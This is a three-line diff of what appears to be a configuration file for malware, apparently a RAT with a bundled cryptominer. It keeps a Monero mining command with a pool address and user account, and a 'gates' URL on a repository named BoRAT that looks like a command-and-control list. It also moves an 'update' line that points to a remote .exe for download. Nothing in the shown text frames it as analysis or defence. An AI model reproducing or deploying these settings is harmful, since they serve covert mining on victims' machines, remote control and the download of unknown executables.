@@ -1,3 +1,3 @@
-update=http://download.com/d.exe
 config=-o stratum+tcp://xmr.pool.minergate.com:45560 -u ebash.0@yandex.com -p x -t 1 -v 0 -k
 gates=https://github.com/ebash0/BoRAT/ss.txt
+update=http://download.com/d.exe
